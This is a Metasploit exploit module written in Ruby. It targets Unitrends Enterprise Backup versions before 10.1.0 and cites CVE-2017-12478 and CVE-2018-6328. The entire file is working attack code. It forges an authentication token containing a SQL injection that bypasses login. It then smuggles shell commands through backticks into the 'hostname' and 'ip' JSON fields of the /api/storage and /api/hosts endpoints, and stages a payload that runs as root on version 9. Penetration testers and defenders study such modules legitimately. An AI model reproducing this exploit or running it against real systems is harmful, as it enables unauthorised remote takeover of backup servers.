# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Unitrends UEB http api remote code execution&#039;,
      &#039;Description&#039;    => %q{
        It was discovered that the api/storage web interface in Unitrends Backup (UB)
        before 10.0.0 has an issue in which one of its input parameters was not validated.
        A remote attacker could use this flaw to bypass authentication and execute arbitrary
        commands with root privilege on the target system.
        UEB v9 runs the api under root privileges and api/storage is vulnerable.
        UEB v10 runs the api under limited privileges and api/hosts is vulnerable.
      },
      &#039;Author&#039;         =>
        [
          &#039;Cale Smith&#039;,    # @0xC413
          &#039;Benny Husted&#039;, # @BennyHusted
          &#039;Jared Arave&#039;,   # @iotennui
          &#039;h00die&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039; => [ARCH_X86],
      &#039;CmdStagerFlavor&#039; => [ &#039;printf&#039; ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000TO5PAAW/000005756&#039;],
          [&#039;URL&#039;, &#039;https://support.unitrends.com/UnitrendsBackup/s/article/000006002&#039;],
          [&#039;URL&#039;, &#039;https://nvd.nist.gov/vuln/detail/CVE-2017-12478&#039;],
          [&#039;URL&#039;, &#039;http://blog.redactedsec.net/exploits/2018/01/29/UEB9.html&#039;],
          [&#039;EDB&#039;, &#039;44297&#039;],
          [&#039;CVE&#039;, &#039;2017-12478&#039;],
          [&#039;CVE&#039;, &#039;2018-6328&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;UEB 9.*&#039;, { &#039;Privileged&#039; => true} ],
          [ &#039;UEB < 10.1.0&#039;, { &#039;Privileged&#039; => false} ]
        ],
      &#039;DefaultOptions&#039; => {
          &#039;SSL&#039; => true
        },
      &#039;DisclosureDate&#039;  => &#039;Aug 8 2017&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true])
      ])
    deregister_options(&#039;SRVHOST&#039;, &#039;SRVPORT&#039;)
  end

  def auth_token
    session = "v0:b&#039; UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0"  #SQLi auth bypass
    Base64.strict_encode64(session) #b64 encode session token
  end

  def check
    res = send_request_cgi!({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => &#039;/api/systems/details&#039;,
        &#039;ctype&#039;  => &#039;application/json&#039;,
        &#039;headers&#039; =>
        {&#039;AuthToken&#039; => auth_token}
      })
    if res && res.code == 200
      print_good("Good news, looks like a vulnerable version of UEB.")
      return CheckCode::Appears
    else
      print_bad(&#039;Host does not appear to be vulnerable.&#039;)
    end
    return CheckCode::Safe
  end

  #substitue some charactes
  def filter_bad_chars(cmd)
    cmd.gsub!("\\", "\\\\\\")
    cmd.gsub!("&#039;", &#039;\\"&#039;)
  end

  def execute_command(cmd, opts = {})
    if target.name == &#039;UEB 9.*&#039;
      #substitue the cmd into the hostname parameter
      parms = %Q|{"type":4,"name":"_Stateless","usage":"stateless","build_filesystem":1,"properties":{"username":"aaaa","password":"aaaa","hostname":"`|
      parms << filter_bad_chars(cmd)
      parms << %Q|` &","port":"2049","protocol":"nfs","share_name":"aaa"}}|
      uri = &#039;/api/storage&#039;
    elsif target.name == &#039;UEB < 10.1.0&#039;
      parms = %Q|{"name":"ffff","ip":"10.0.0.200&#039;\\"`0&|
      parms << filter_bad_chars(cmd)
      parms << %Q|`&#039;"}|
      uri = &#039;/api/hosts&#039;
    end

    res = send_request_cgi({
      &#039;uri&#039; => uri,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;encode_params&#039; => false,
      &#039;data&#039;   => parms,
      &#039;headers&#039; =>
        {&#039;AuthToken&#039; => auth_token}
    })

    if res && res.code != 500
      fail_with(Failure::UnexpectedReply,&#039;Unexpected response&#039;)
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
  end

  def exploit
    print_status("#{peer} - Sending requests to UEB...")
    execute_cmdstager(:linemax => 120)
  end
end

